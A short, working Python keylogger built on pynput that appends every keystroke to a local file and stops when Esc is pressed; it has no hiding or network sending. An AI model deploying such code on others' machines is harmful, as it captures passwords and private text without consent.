from pynput.keyboard import Key, Listener

# Define the file where the key logs will be saved
log_file = "key_log.txt"

def on_press(key):
    # Append each keystroke to the log file
    with open(log_file, "a") as f:
        try:
            # Write the character if it's a normal key
            f.write(f"{key.char}")
        except AttributeError:
            # Write a newline if the key is "Enter"
            if key == Key.enter:
                f.write("\n")
            # Substitute "Backspace" with "--"
            elif key == Key.backspace:
                f.write("--")
            # Write a space character for the "Space" key
            elif key == Key.space:
                f.write(" ")
            else:
                # Write other special keys as is (e.g., Tab, Esc)
                f.write(f" [{key}] ")

def on_release(key):
    # Stop listener on pressing Esc
    if key == Key.esc:
        return False

# Set up the listener for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
